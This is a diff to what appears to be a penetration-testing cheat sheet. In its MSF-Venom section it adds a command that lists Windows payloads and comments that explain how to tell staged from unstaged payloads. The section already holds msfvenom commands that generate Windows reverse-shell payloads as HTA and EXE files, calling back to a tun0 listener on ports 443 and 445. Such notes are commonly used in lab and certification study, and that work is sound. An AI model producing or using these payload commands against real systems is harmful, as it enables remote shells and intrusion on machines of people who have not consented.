@@ -101,10 +101,15 @@ Enter-PSSession 1 # session ID [1]
 
 ### MSF-Venom
 ```bash
+# list payloads based on architecture & OS
+msfvenom -l payloads --platform windows --arch x64
+# differentiate stages vs. unstaged
+# if the payload has a '/' between shell & reverse TCP, it's a staged payload, else not.
+# windows/x64/meterpreter/shell_reverse_tcp vs. windows/x64/meterpreter/shell/reverse_tcp
+# payload examples
 msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=445 -f hta-psh -o shell.hta
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=445 -f exe -o shell_445.exe
 msfvenom -p windows/shell/reverse_tcp LHOST=tun0 LPORT=443 -f exe -o shell_443.exe # non meterpreter shell.
-# other payloads 
 
 
 ```
